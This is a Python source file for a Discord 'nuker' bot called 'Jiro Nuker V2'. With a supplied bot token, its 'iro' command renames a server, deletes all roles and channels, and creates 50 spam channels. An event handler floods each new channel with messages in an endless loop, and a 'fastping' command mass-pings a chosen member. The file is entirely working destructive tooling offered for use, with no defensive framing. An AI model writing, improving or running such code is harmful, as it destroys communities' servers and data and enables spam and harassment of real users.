import os
import discord
import colorama
import asyncio
from discord.ext import commands
from colorama import Fore as F, Style as S
from pystyle import Colors, Colorate

r = F.BLUE
w = F.RESET
g = F.GREEN
t = F.LIGHTBLACK_EX
a = F.WHITE
c = F.RED
b = F.LIGHTGREEN_EX

print(Colorate.Horizontal(Colors.red_to_white,'''
         
       
                                               

                                                           
                          _________________________________________________________________________________ 
                         |      $$\      $$\ $$\   $$\ $$$$$$$$\  $$$$$$\  $$\   $$\  $$$$$$\             | 
                         |      $$ | $\  $$ |$$ |  $$ |\____$$  |$$  __$$\ $$$\  $$ |$$  __$$\            |
                         |      $$ |$$$\ $$ |$$ |  $$ |    $$  / $$ /  \__|$$$$\ $$ |$$ /  \__|           | 
                         |      $$ $$ $$\$$ |$$$$$$$$ |   $$  /  $$ |$$$$\ $$ $$\$$ |$$ |$$$$\            | 
                         |      $$$$  _$$$$ |$$  __$$ |  $$  /   $$ |\_$$ |$$ \$$$$ |$$ |\_$$ |           | 
                         |      $$$  / \$$$ |$$ |  $$ | $$  /    $$ |  $$ |$$ |\$$$ |$$ |  $$ |           |
                         |      $$  /   \$$ |$$ |  $$ |$$$$$$$$\ \$$$$$$  |$$ | \$$ |\$$$$$$  |           |  
                         |       \__/     \__|\__|  \__|\________| \______/ \__|  \__| \______/           | 
                         |________________________________________________________________________________|  

'''))

token = input(f'{b} {a} TOKEN : ')  
channels_name = input(f'{b} {a} CHANNEL NAME : ')
spam_message = input(f'{b} {a} SPAM MESSAGE : ')


intents = discord.Intents.all()
whzgng = commands.Bot(command_prefix=["j", "j"], intents=intents)
whzgng.remove_command('help')

@whzgng.event
async def on_ready():
    game = discord.Game("Jiro Nuker V2")
    await whzgng.change_presence(status=discord.Status.dnd, activity=game)
    os.system('cls')
    print(f'''
         
                          _________________________________________________________________________________ 
                         |      $$\      $$\ $$\   $$\ $$$$$$$$\  $$$$$$\  $$\   $$\  $$$$$$\             | 
                         |      $$ | $\  $$ |$$ |  $$ |\____$$  |$$  __$$\ $$$\  $$ |$$  __$$\            |
                         |      $$ |$$$\ $$ |$$ |  $$ |    $$  / $$ /  \__|$$$$\ $$ |$$ /  \__|           | 
                         |      $$ $$ $$\$$ |$$$$$$$$ |   $$  /  $$ |$$$$\ $$ $$\$$ |$$ |$$$$\            | 
                         |      $$$$  _$$$$ |$$  __$$ |  $$  /   $$ |\_$$ |$$ \$$$$ |$$ |\_$$ |           | 
                         |      $$$  / \$$$ |$$ |  $$ | $$  /    $$ |  $$ |$$ |\$$$ |$$ |  $$ |           |
                         |      $$  /   \$$ |$$ |  $$ |$$$$$$$$\ \$$$$$$  |$$ | \$$ |\$$$$$$  |           |  
                         |       \__/     \__|\__|  \__|\________| \______/ \__|  \__| \______/           | 
                         |________________________________________________________________________________|  
''')

@whzgng.event
async def on_guild_channel_create(channel):
    while True:
        await channel.send(spam_message)
        print(f'{b}[ + ]{F.RESET} Sent: {spam_message}')

@whzgng.event
async def on_guild_join(guild):
    for channel in guild.text_channels:
        if channel.permissions_for(guild.me).create_instant_invite:
            invite = await channel.create_invite()
            print(f"Joined Guild: {guild.name} ({guild.id}) Invite: {invite}")
            break

@whzgng.command()
async def iro(ctx):
    try:
        await ctx.message.delete()
    except discord.Forbidden:
        print(f"{c}[ - ]{F.RESET} Missing permissions to delete the message")

    print(f"Nuking {ctx.guild.name} ({ctx.guild.id})...")
    await ctx.guild.edit(name="WHIZ ON TOP")
    delete_role_tasks = [role.delete() for role in ctx.guild.roles]
    for delete_role_task in asyncio.as_completed(delete_role_tasks):
        try:
            await delete_role_task
            print(f'{b}[ + ]{F.RESET} Role Deleted')
        except Exception as e:
            print(f'{c}[ - ]{F.RESET} Role NOT Deleted: {e}')

    delete_channel_tasks = [channel.delete() for channel in ctx.guild.channels]
    for delete_channel_task in asyncio.as_completed(delete_channel_tasks):
        try:
            await delete_channel_task
            print(f'{b}[ + ]{F.RESET} Channel Deleted')
        except Exception as e:
            print(f'{c}[ - ]{F.RESET} Channel NOT Deleted: {e}')

    create_channel_tasks = [ctx.guild.create_text_channel(channels_name) for _ in range(50)]
    for create_channel_task in asyncio.as_completed(create_channel_tasks):
        try:
            await create_channel_task
            print(f'{b}[ + ]{F.RESET} Created Channel')
        except Exception as e:
            print(f'{c}[ - ]{F.RESET} Channel Not Created: {e}')

@whzgng.command()
async def fastping(ctx, member: discord.Member, times: int):
    await ctx.message.delete()
    print(f"Started pinging {member} {times} times.")

    ping_message = f"@{member.mention} You have been pinged!"

    async def ping_member():
        for _ in range(times):
            await ctx.send(ping_message)
            await asyncio.sleep(0.5)  # Adjusted delay to avoid rate limit issues

    await ping_member()

    print(f"Finished pinging {member}.")

try:
    whzgng.run(token)
except Exception as e:
    print(f"Error running bot: {e}")
